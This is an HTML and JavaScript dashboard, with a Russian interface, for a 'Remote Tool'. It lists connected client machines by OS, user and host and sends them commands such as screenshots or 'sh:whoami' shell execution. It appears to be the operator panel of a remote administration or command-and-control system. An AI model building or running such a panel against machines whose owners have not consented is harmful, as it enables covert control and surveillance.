<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8">
  <meta name="csrf-token" content="{{ csrf_token }}">
  <title>Remote Tool — Dashboard</title>
  <style>
    body{font-family:system-ui,sans-serif;background:#111;color:#eee;margin:0;padding:1rem}
    header{display:flex;justify-content:space-between;align-items:center;margin-bottom:1rem}
    button{padding:.5rem .9rem;border:0;border-radius:8px;background:#3b82f6;
           color:#fff;cursor:pointer}
    button:hover{background:#2563eb}
    #clients{display:grid;gap:.5rem;margin-bottom:1rem}
    .client{background:#1c1c1c;padding:.7rem;border-radius:8px;cursor:pointer;
            border:1px solid #222}
    .client.active{border-color:#3b82f6}
    #cmd{width:100%;padding:.6rem;border-radius:8px;border:1px solid #333;
         background:#0d0d0d;color:#eee;box-sizing:border-box}
    #out{white-space:pre-wrap;background:#0d0d0d;padding:1rem;border-radius:8px;
         margin-top:1rem;min-height:200px;border:1px solid #222;overflow:auto;max-height:60vh}
  </style>
</head>
<body>
  <header>
    <h2>Remote Tool — Dashboard</h2>
    <form method="post" action="/logout">
      <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
      <button type="submit">Выйти</button>
    </form>
  </header>

  <div id="clients"></div>
  <input id="cmd" placeholder="Команда (например: info, screenshot, sh:whoami)">
  <button id="send">Отправить</button>
  <div id="out"></div>

<script>
const csrf = document.querySelector('meta[name="csrf-token"]').content;
let selected = null;

async function refresh() {
  const r = await fetch('/api/clients', {credentials: 'same-origin'});
  if (r.status === 401) { location.href = '/login'; return; }
  const list = await r.json();
  const box = document.getElementById('clients');
  box.innerHTML = '';
  for (const c of list) {
    const d = document.createElement('div');
    d.className = 'client' + (c.id === selected ? ' active' : '');
    d.textContent = `${c.id} — ${c.info?.os || '?'} / ${c.info?.user || '?'} (${c.info?.host || '?'})`;
    d.onclick = () => { selected = c.id; refresh(); };
    box.appendChild(d);
  }
}

document.getElementById('send').onclick = async () => {
  const cmd = document.getElementById('cmd').value.trim();
  if (!selected || !cmd) return;
  const r = await fetch('/api/command', {
    method: 'POST',
    credentials: 'same-origin',
    headers: {'Content-Type': 'application/json', 'X-CSRFToken': csrf},
    body: JSON.stringify({client_id: selected, cmd})
  });
  const out = document.getElementById('out');
  out.textContent = r.ok ? `[+] Отправлено: ${cmd}` : `[!] Ошибка: ${r.status}`;
  document.getElementById('cmd').value = '';
};

setInterval(refresh, 5000);
refresh();
</script>
</body>
</html>
